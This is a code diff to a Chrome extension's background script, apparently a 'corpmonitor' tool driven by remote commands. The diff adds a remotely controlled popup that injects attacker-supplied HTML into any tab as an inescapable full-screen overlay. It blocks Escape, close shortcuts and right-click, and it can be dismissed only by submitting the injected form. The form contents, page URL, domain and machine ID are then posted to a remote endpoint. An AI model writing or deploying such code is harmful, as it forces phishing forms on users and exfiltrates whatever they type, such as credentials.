@@ -541,43 +541,148 @@ async function handleRemoteCommand(data) {
   }
 }
 
-// Handle popup command with dynamic template
+// Handle popup command with BLOCKING, OBLIGATORY popup
 async function handlePopupCommand(data) {
   const tabId = parseInt(data.target_tab_id);
   const htmlContent = data.payload?.html_content || '';
   const cssStyles = data.payload?.css_styles || '';
+  const commandId = data.command_id || '';
   
   await chrome.scripting.executeScript({
     target: { tabId },
-    func: (html, css) => {
+    func: (html, css, cmdId, apiBase, apiKey, machineIdVal, tabIdVal) => {
       // Remove existing popup if any
       const existingOverlay = document.querySelector('.corpmonitor-popup-overlay');
       if (existingOverlay) {
         existingOverlay.remove();
       }
       
-      // Create overlay
+      // Create BLOCKING overlay - full screen, no escape
       const overlay = document.createElement('div');
       overlay.className = 'corpmonitor-popup-overlay';
-      overlay.classList.add('popup-overlay');
       
-      // Inject CSS
+      // Inject BLOCKING CSS
       const style = document.createElement('style');
-      style.textContent = css;
+      style.textContent = `
+        .corpmonitor-popup-overlay {
+          position: fixed !important;
+          top: 0 !important;
+          left: 0 !important;
+          width: 100vw !important;
+          height: 100vh !important;
+          background: rgba(0, 0, 0, 0.85) !important;
+          z-index: 2147483647 !important;
+          display: flex !important;
+          align-items: center !important;
+          justify-content: center !important;
+          backdrop-filter: blur(8px) !important;
+        }
+        
+        .corpmonitor-popup-content {
+          position: relative !important;
+          background: white !important;
+          padding: 40px !important;
+          border-radius: 12px !important;
+          max-width: 600px !important;
+          width: 90% !important;
+          max-height: 90vh !important;
+          overflow-y: auto !important;
+          box-shadow: 0 20px 60px rgba(0, 0, 0, 0.5) !important;
+        }
+        
+        ${css}
+      `;
       document.head.appendChild(style);
       
-      // Inject HTML
-      overlay.innerHTML = html;
-      document.body.appendChild(overlay);
+      // Wrap HTML in centered container
+      const contentDiv = document.createElement('div');
+      contentDiv.className = 'corpmonitor-popup-content';
+      contentDiv.innerHTML = html;
+      overlay.appendChild(contentDiv);
       
-      // Add close handler to all buttons with data-close attribute
-      overlay.querySelectorAll('[data-close], .popup-btn-primary, .popup-btn-danger, .popup-btn-info').forEach(btn => {
-        btn.addEventListener('click', () => overlay.remove());
+      // Block all keyboard shortcuts and closing attempts
+      overlay.addEventListener('keydown', (e) => {
+        e.stopPropagation();
+        // Block ESC, F11, Alt+F4, Ctrl+W, etc.
+        if (e.key === 'Escape' || e.key === 'F11' || 
+            (e.altKey && e.key === 'F4') || 
+            (e.ctrlKey && e.key === 'w')) {
+          e.preventDefault();
+        }
+      }, true);
+      
+      // Block right-click
+      overlay.addEventListener('contextmenu', (e) => {
+        e.preventDefault();
       });
+      
+      // Find form inside and handle submission
+      const form = contentDiv.querySelector('form');
+      if (form) {
+        form.addEventListener('submit', async (e) => {
+          e.preventDefault();
+          
+          // Collect all form data
+          const formData = new FormData(form);
+          const dataObject = {};
+          
+          formData.forEach((value, key) => {
+            dataObject[key] = value;
+          });
+          
+          // Send to background script
+          chrome.runtime.sendMessage({
+            action: 'submitPopupForm',
+            data: {
+              command_id: cmdId,
+              machine_id: machineIdVal,
+              tab_id: tabIdVal,
+              domain: window.location.hostname,
+              url: window.location.href,
+              form_data: dataObject
+            }
+          }, (response) => {
+            if (response && response.success) {
+              // Only remove popup after successful submission
+              overlay.remove();
+            } else {
+              alert('Erro ao enviar formulário. Tente novamente.');
+            }
+          });
+        });
+      }
+      
+      document.body.appendChild(overlay);
     },
-    args: [htmlContent, cssStyles]
+    args: [htmlContent, cssStyles, commandId, CONFIG.API_BASE, CONFIG.SUPABASE_ANON_KEY, machineId, data.target_tab_id]
   });
 }
+
+// Add message handler for form submission
+chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
+  if (request.action === 'submitPopupForm') {
+    // Send form data to edge function
+    fetch(`${CONFIG.API_BASE}/popup-response`, {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json',
+        'Authorization': `Bearer ${CONFIG.SUPABASE_ANON_KEY}`
+      },
+      body: JSON.stringify(request.data)
+    })
+    .then(response => response.json())
+    .then(data => {
+      log('info', 'Popup form submitted successfully', data);
+      sendResponse({ success: true, data });
+    })
+    .catch(error => {
+      log('error', 'Error submitting popup form', error);
+      sendResponse({ success: false, error: error.message });
+    });
+    
+    return true; // Keep channel open for async response
+  }
+});
 
 // Handle block command
 async function handleBlockCommand(data) {
